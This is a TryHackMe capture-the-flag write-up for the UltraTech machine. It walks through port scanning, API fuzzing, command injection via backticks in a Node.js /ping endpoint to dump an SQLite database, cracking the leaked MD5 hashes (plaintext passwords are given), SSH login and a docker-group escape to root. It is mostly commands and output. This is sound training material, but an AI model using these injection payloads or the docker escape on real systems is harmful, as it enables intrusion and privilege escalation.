# CTF: UltraTech (THM)

**Target IP:** `10.49.155.147` ($target)

## Metadata

- **CTF Name:** UltraTech
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-19
    
- **Difficulty:** Medium
    
- **Tools Used:** nmap, ffuf, crackstation, ssh, docker
    
- **Key Skills/Tools:** API Enumeration, Command Injection, Hash Cracking (MD5), Docker Group Privilege Escalation (GTFOBins).
    

## Introduction

This walkthrough documents the exploitation of the **UltraTech** machine on TryHackMe. The path to root involves enumerating a Node.js API, exploiting a command injection vulnerability in a ping utility to leak a database file, cracking user hashes, and leveraging the `docker` group membership for container-to-host privilege escalation.

**Limitations & Confidence:**

- **Confidence Level:** High. This writeup is strictly based on the provided terminal logs and command history.
    
- **Limitations:** The initial foothold relies on a specific API parameter (`ip`) which was discovered through manual testing after a 500 error.
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Ultratech)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt
```

**Key Results:**

- **21/tcp:** vsftpd 3.0.5
    
- **22/tcp:** OpenSSH 8.2p1 (Ubuntu)
    
- **8081/tcp:** Node.js Express framework
    
- **31331/tcp:** HTTP (Apache)
    

## Foothold

### 1. Web Enumeration (API)

I used `ffuf` to discover hidden endpoints on the Node.js service running on port 8081.

**Command:**

```
😎 amuzed@Kali (~/THM/Ultratech)
$ ffuf -u http://$target:8081/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Results:**

- `/auth`
    
- `/ping` (Returned Status 500 initially)
    

### 2. Command Injection

Visiting `/ping` directly produced a stack trace indicating it was looking for a property to `replace`. Testing for parameters led to the discovery of the `ip` parameter.

**Standard Usage:**

`http://10.49.155.147:8081/ping?ip=127.0.0.1`

**Injection & Data Leakage:**

I exploited backticks to execute system commands and read the local SQLite database.

```
# Command to list files
[http://10.49.155.147:8081/ping?ip=](http://10.49.155.147:8081/ping?ip=)`ls`
# Result: ping: utech.db.sqlite: Name or service not known

# Command to read the database
[http://10.49.155.147:8081/ping?ip=](http://10.49.155.147:8081/ping?ip=)`cat%20utech.db.sqlite`
```

**Leaked Hashes:**

- `r00t:f357a0c52799563c7c7b76c1e7543a32`
    
- `admin:0d0ea5111e3c1def594c1684e3b9be84`
    

### 3. Hash Cracking

The hashes were identified as MD5 and cracked using Crackstation.

|   |   |   |
|---|---|---|
|**User**|**Hash**|**Result**|
|r00t|f357a0c52799563c7c7b76c1e7543a32|**n100906**|
|admin|0d0ea5111e3c1def594c1684e3b9be84|**mrsheafy**|

## Lateral Movement

### 1. SSH Access

Using the cracked credentials for the user `r00t`, I gained access to the system via SSH.

**Command:**

```
😎 amuzed@Kali (~/THM/Ultratech)
$ ssh r00t@$target
# Password: n100906
```

## Privilege Escalation

### 1. Group Enumeration

Upon logging in, I checked the user's ID and discovered that `r00t` is a member of the `docker` group.

**Command:**

```
r00t@ip-10-49-177-119:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

### 2. Docker Escape (GTFOBins)

Membership in the `docker` group allows a user to mount the host's root filesystem inside a container, providing full root access to the host.

**Command:**

```
r00t@ip-10-49-177-119:~$ docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

**Gaining Root:**

```
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
